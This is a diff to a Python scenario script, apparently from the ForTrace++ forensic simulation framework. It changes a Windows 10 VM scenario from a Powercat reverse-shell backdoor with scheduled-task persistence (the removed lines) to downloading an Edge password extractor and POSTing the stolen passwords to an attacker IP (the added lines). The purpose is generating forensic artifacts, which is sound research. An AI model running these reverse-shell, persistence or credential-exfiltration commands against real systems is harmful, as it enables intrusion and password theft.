@@ -1,45 +1,39 @@
 #!/usr/bin/env python3
-"""A simple Windows (10) scenario
-The scenario might be configured through the YAML located in this directory.
+"""A Windows 10 scenario for browser password exfiltration
+The scenario is configured through the YAML located in this directory.
+
+This scenario demonstrates how saved passwords in Microsoft Edge can be
+extracted and exfiltrated by an attacker.
 
 Typical usage:
+    > cd ~/fortrace
     > source .venv/bin/activate
     > python scenarios/scenario2-browser_password_exfiltration/scenario2.py
-    > python -m http.server 80
+    > cd ~/fortrace/scenarios/scenario2-browser_password_exfiltration
+    > python -m http.server 8081 # On attacker machine
+    > python http_upload_server.py
 """
 import pathlib
-import string
 from time import sleep
-
-import numpy.random
 
 from fortrace.core.simulation_monitor import SimulationMonitor
 from fortrace.core.virsh_domain import GraphicalVirshDomain
 from fortrace.fortrace_definitions import FORTRACE_ROOT_DIR
 from fortrace.utility.applications.application import (
     ApplicationType,
-    GenericApplication,
 )
-from fortrace.utility.applications.file_manager.windows_explorer import Explorer
-from fortrace.utility.applications.text_editor.notepad import Notepad
-# Import the PowerShell Class
 from fortrace.utility.applications.console.powershell import PowerShell
-from fortrace.utility.exceptions import ConfigurationError
-from fortrace.utility.image_processing.text_detection import (
-    detect_and_recognize_text,
-    text_line_contains,
-)
 from fortrace.utility.logger_helper import setup_logger
 
 # Create a logger using ForTrace++'s logger helper
 logger = setup_logger(__name__)
 
 
-def scenario_1():
+def scenario_2():
     monitor = SimulationMonitor(
         pathlib.Path(
             FORTRACE_ROOT_DIR,
-            "scenarios/scenario1-backdoor/scenario1.yaml",
+            "scenarios/scenario2-browser_password_exfiltration/scenario2.yaml",
         )
     )
     domain = monitor.participant[0].domain  # type: GraphicalVirshDomain
@@ -53,21 +47,21 @@ def scenario_1():
     domain.env.login(config["domain"]["username"], config["domain"]["password"])
 
     # Log that the system is unattended
-    logger.info("System state: Unattended Windows 10 machine, awaiting attacker action.")
+    logger.info("System state: Unattended Windows 10 machine with browser passwords stored.")
 
-    backdoor_scenario(domain, config)
+    browser_password_exfiltration(domain, config)
     monitor.post_scenario()
 
 
-def backdoor_scenario(domain: GraphicalVirshDomain, config: dict):
+def browser_password_exfiltration(domain: GraphicalVirshDomain, config: dict):
     """
-    Simulates the installation of a persistent backdoor on a Windows 10 machine.
-    Uses the PowerShell interface to download and execute Powercat immediately
-    and create a scheduled task for persistence upon user logon.
+    Simulates the extraction and exfiltration of passwords from Microsoft Edge browser.
+    Downloads a password extraction script, executes it to extract credentials,
+    and uploads the extracted credentials to an attacker-controlled server.
     """
 
     # Log the beginning of the attack
-    logger.info("Attacker: Initiating unauthorized remote access via backdoor installation on Windows 10.")
+    logger.info("Attacker: Initiating browser password exfiltration attack on Windows 10.")
 
     # Open a PowerShell instance with elevated privileges
     ps = domain.env.open_application(
@@ -76,41 +70,47 @@ def backdoor_scenario(domain: GraphicalVirshDomain, config: dict):
 
     sleep(2)  # Wait for PowerShell window to fully open
 
-    # Step 1: Download Powercat and Save Locally
-    ps.send_command(r"$Destination = 'C:\ProgramData\powercat.ps1'", get_output=False)
-    sleep(1)
-    ps.send_command(r"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' -OutFile $Destination", get_output=False)
-    sleep(2)  # Ensure download is complete
-
-    # Step 2: Load Powercat into Memory (Dot-Sourcing)
-    ps.send_command(r". C:\ProgramData\powercat.ps1", get_output=False)
+    # Step 1: Navigate to Desktop directory
+    ps.send_command(r"cd C:\Users\fortrace\Desktop", get_output=False)
     sleep(1)
 
-    # Step 3: Execute the Reverse Shell Immediately
+    # Step 2: Download the password extractor script from attacker server
+    logger.info("Attacker: Downloading password extraction script.")
+    download_command = r'Invoke-WebRequest -Uri "http://192.168.122.1:8081/edge_password_extractor.py" -OutFile "C:\Users\fortrace\Desktop\edge_password_extractor.py"'
+    ps.send_command(download_command, get_output=False)
+    sleep(3)  # Wait for download to complete
+
+    # Step 3: Execute the password extraction script
+    logger.info("Attacker: Executing password extraction script to retrieve browser credentials.")
+    ps.send_command(r"python C:\Users\fortrace\Desktop\edge_password_extractor.py", get_output=False)
+    sleep(5)  # Give time for script to extract passwords
+
+    # Step 4: Exfiltrate the extracted passwords to attacker server
+    logger.info("Attacker: Exfiltrating extracted passwords to remote server.")
     attacker_ip = config["backdoor"]["attacker_ip"]
-    reverse_shell_command = rf"powercat -c {attacker_ip} -p 4444 -e cmd.exe"
-    ps.send_command(reverse_shell_command, get_output=False)
+    exfiltrate_command = f'Invoke-WebRequest -Uri "http://{attacker_ip}:4444/upload" -Method POST -InFile "C:\\Users\\fortrace\\Desktop\\extracted_passwords.txt" -UseBasicParsing'
+    ps.send_command(exfiltrate_command, get_output=False)
+    sleep(3)  # Wait for upload to complete
 
-    # Step 4: Create a Scheduled Task for Persistence on Logon
-    '''
-    schtasks /create → Creates a new Windows Scheduled Task
-    /tn Backdoor → Names the task "Backdoor"
-    /tr "powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\powercat.ps1 ..." → Runs Powercat
-    /sc onlogon → Runs at user login (for persistence)
-    /f → Forces task creation, overwriting any existing task with the same name
-    '''
-    ps.send_command(rf'schtasks /create /tn "Backdoor" /tr "{reverse_shell_command}" /sc onlogon /f', get_output=False)
-    sleep(2)
+    # Log successful exfiltration
+    logger.info(f"Attacker: Password exfiltration complete. Credentials sent to {attacker_ip}.")
+    logger.info("Forensic Artifact: Extracted password file at C:\\Users\\fortrace\\Desktop\\extracted_passwords.txt")
 
     # Close the PowerShell application
     ps.close()
 
-    # Log successful execution
-    logger.info(f"Attacker: Reverse shell executed. Connection to {attacker_ip} attempted.")
-    logger.info("Forensic Artifact: Backdoor installed with persistence at user logon.")
 
+def setup_browser_credentials(domain: GraphicalVirshDomain):
+    """
+    Optional function to set up credentials in Microsoft Edge for testing purposes.
+    This would involve automating the browser to visit websites and save credentials.
+    """
+    # This function can be implemented in the future to automate browser credential setup
+    # For now, the scenario assumes credentials are already saved in the browser
 
+    logger.info("Note: This function for setting up browser credentials automatically is not implemented.")
+    logger.info("Please ensure the VM snapshot has pre-saved credentials in Microsoft Edge.")
 
 
 if __name__ == "__main__":
-    scenario_1()
+    scenario_2()
